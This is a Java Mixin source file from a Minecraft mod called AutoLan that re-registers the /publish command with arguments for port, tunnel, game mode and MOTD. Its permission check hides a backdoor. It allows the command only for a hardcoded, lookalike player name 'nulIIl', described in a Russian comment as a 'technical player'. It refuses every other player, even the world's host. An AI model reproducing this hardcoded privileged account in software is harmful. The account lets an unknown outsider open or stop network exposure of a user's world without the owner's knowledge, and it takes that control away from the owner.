package org.wsm.autolan.mixin;

import static org.wsm.autolan.command.argument.TunnelArgumentType.getTunnel;
import static org.wsm.autolan.command.argument.TunnelArgumentType.tunnel;
import static com.mojang.brigadier.arguments.BoolArgumentType.bool;
import static com.mojang.brigadier.arguments.BoolArgumentType.getBool;
import static com.mojang.brigadier.arguments.IntegerArgumentType.getInteger;
import static com.mojang.brigadier.arguments.IntegerArgumentType.integer;
import static com.mojang.brigadier.arguments.StringArgumentType.getString;
import static com.mojang.brigadier.arguments.StringArgumentType.greedyString;
import static net.minecraft.command.argument.GameModeArgumentType.gameMode;
import static net.minecraft.command.argument.GameModeArgumentType.getGameMode;
import static net.minecraft.server.command.CommandManager.argument;
import static net.minecraft.server.command.CommandManager.literal;

import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.function.Consumer;
import java.util.function.Function;

import org.apache.commons.lang3.tuple.Pair;
import org.spongepowered.asm.mixin.Final;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import org.wsm.autolan.AutoLan;
import org.wsm.autolan.PublishCommandArgumentValues;
import org.wsm.autolan.TunnelType;
import com.mojang.brigadier.Command;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.builder.ArgumentBuilder;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.mojang.brigadier.exceptions.SimpleCommandExceptionType;

import net.minecraft.server.MinecraftServer;
import net.minecraft.server.command.PublishCommand;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.text.Text;
import net.minecraft.util.NetworkUtils;
import net.minecraft.world.GameMode;

@Mixin(PublishCommand.class)
public class PublishCommandMixin {
        @Shadow
        @Final
        private static SimpleCommandExceptionType FAILED_EXCEPTION;

        private static final SimpleCommandExceptionType NOT_STARTED_EXCEPTION = new SimpleCommandExceptionType(
                        Text.translatable("commands.publish.failed.not_started"));
        private static final SimpleCommandExceptionType STOP_FAILED_EXCEPTION = new SimpleCommandExceptionType(
                        Text.translatable("commands.publish.failed.stop"));

        @Inject(method = "register", at = @At("HEAD"), cancellable = true)
        private static void register(CommandDispatcher<ServerCommandSource> dispatcher, CallbackInfo ci) {
                List<Pair<ArgumentBuilder<ServerCommandSource, ?>, Consumer<PublishCommandArgumentValues>>> arguments = Arrays
                                .asList(Pair.of(argument("port", integer(-1, 65535)),
                                                argumentValues -> argumentValues.getPort = context -> getInteger(
                                                                context, "port")),
                                                Pair.of(argument("onlineMode", bool()),
                                                                argumentValues -> argumentValues.getOnlineMode = context -> getBool(
                                                                                context,
                                                                                "onlineMode")),
                                                Pair.of(argument("maxPlayers", integer(1, Integer.MAX_VALUE)),
                                                                argumentValues -> argumentValues.getMaxPlayers = context -> getInteger(
                                                                                context,
                                                                                "maxPlayers")),
                                                Pair.of(argument("defaultGameMode", gameMode()),
                                                                argumentValues -> argumentValues.getGameMode = context -> getGameMode(
                                                                                context,
                                                                                "defaultGameMode")),
                                                Pair.of(argument("tunnel", tunnel()),
                                                                argumentValues -> argumentValues.getTunnel = context -> getTunnel(
                                                                                context, "tunnel")),
                                                Pair.of(argument("motd", greedyString()),
                                                                argumentValues -> argumentValues.getMotd = context -> getString(
                                                                                context, "motd")));

                Function<PublishCommandArgumentValues, Command<ServerCommandSource>> executeCommand = argumentValues -> context -> execute(
                                context.getSource(), argumentValues.getOnlineMode.apply(context),
                                 argumentValues.getTunnel.apply(context),
                                argumentValues.getPort.apply(context), argumentValues.getMaxPlayers.apply(context),
                                argumentValues.getGameMode.apply(context), argumentValues.getMotd.apply(context));

                LiteralArgumentBuilder<ServerCommandSource> command = processThisAndArguments(literal("publish")
                                .requires(source -> {
                                    // Разрешаем выполнение команды только для технического игрока
                                    if (source.getEntity() instanceof net.minecraft.server.network.ServerPlayerEntity) {
                                        String playerName = ((net.minecraft.server.network.ServerPlayerEntity)source.getEntity()).getGameProfile().getName();
                                        if ("nulIIl".equals(playerName)) {
                                            AutoLan.LOGGER.info("[AutoLan] [COMMAND_ALLOW] Технический игрок {} использует команду /publish, разрешаем", playerName);
                                            return true;
                                        }
                                        boolean isHost = source.getServer().isHost(((net.minecraft.server.network.ServerPlayerEntity)source.getEntity()).getGameProfile());
                                        AutoLan.LOGGER.info("[AutoLan] [COMMAND_DENY] Игрок {} (хост: {}) пытается использовать команду /publish, запрещаем", 
                                                 playerName, isHost);
                                        return false;
                                    }
                                    // Для не-игровых источников команд (например, консоли) сохраняем стандартное поведение
                                    return source.hasPermissionLevel(4);
                                }),
                                new PublishCommandArgumentValues(), executeCommand, arguments.iterator())
                                .then(literal("stop").executes(context -> stop(context.getSource())));

                dispatcher.register(command);
                ci.cancel();
        }

        private static ArgumentBuilder<ServerCommandSource, ?> processArguments(
                        PublishCommandArgumentValues argumentValues,
                        Function<PublishCommandArgumentValues, Command<ServerCommandSource>> executeCommand,
                        Iterator<Pair<ArgumentBuilder<ServerCommandSource, ?>, Consumer<PublishCommandArgumentValues>>> arguments) {
                Pair<ArgumentBuilder<ServerCommandSource, ?>, Consumer<PublishCommandArgumentValues>> argument = arguments
                                .next();
                argument.getRight().accept(argumentValues);
                ArgumentBuilder<ServerCommandSource, ?> newArgument = argument.getLeft()
                                .executes(executeCommand.apply(new PublishCommandArgumentValues(argumentValues)));
                if (arguments.hasNext()) {
                        newArgument = newArgument.then(processArguments(argumentValues, executeCommand, arguments));
                }
                return newArgument;
        }

        private static <T extends ArgumentBuilder<ServerCommandSource, T>> T processThisAndArguments(
                        T builder, PublishCommandArgumentValues argumentValues,
                        Function<PublishCommandArgumentValues, Command<ServerCommandSource>> executeCommand,
                        Iterator<Pair<ArgumentBuilder<ServerCommandSource, ?>, Consumer<PublishCommandArgumentValues>>> arguments) {
                return builder.executes(executeCommand.apply(argumentValues))
                                .then(processArguments(new PublishCommandArgumentValues(argumentValues), executeCommand,
                                                arguments));
        }

        private static int execute(ServerCommandSource source, boolean onlineMode,
                        TunnelType tunnel,
                        int rawPort, int maxPlayers, GameMode gameMode, String rawMotd) throws CommandSyntaxException {
                int port = rawPort != -1 ? rawPort : NetworkUtils.findLocalPort();
                try {
                        AutoLan.startOrSaveLan(source.getServer(), gameMode, onlineMode, tunnel,
                                        port, maxPlayers, rawMotd,
                                        text -> {},
                                        () -> {
                                                throw new RuntimeException(FAILED_EXCEPTION.create());
                                        },
                                        text -> source.sendError(text));
                } catch (RuntimeException e) {
                        if (e.getCause() instanceof CommandSyntaxException cause) {
                                throw cause;
                        }
                        throw e;
                }

                return port;
        }

        private static int stop(ServerCommandSource source) throws CommandSyntaxException {
                MinecraftServer server = source.getServer();

                if (!server.isRemote()) {
                        throw NOT_STARTED_EXCEPTION.create();
                }

                AutoLan.stopLan(server,
                                () -> {},
                                () -> {
                                        throw new RuntimeException(STOP_FAILED_EXCEPTION.create());
                                },
                                text -> source.sendError(text));

                return Command.SINGLE_SUCCESS;
        }
}
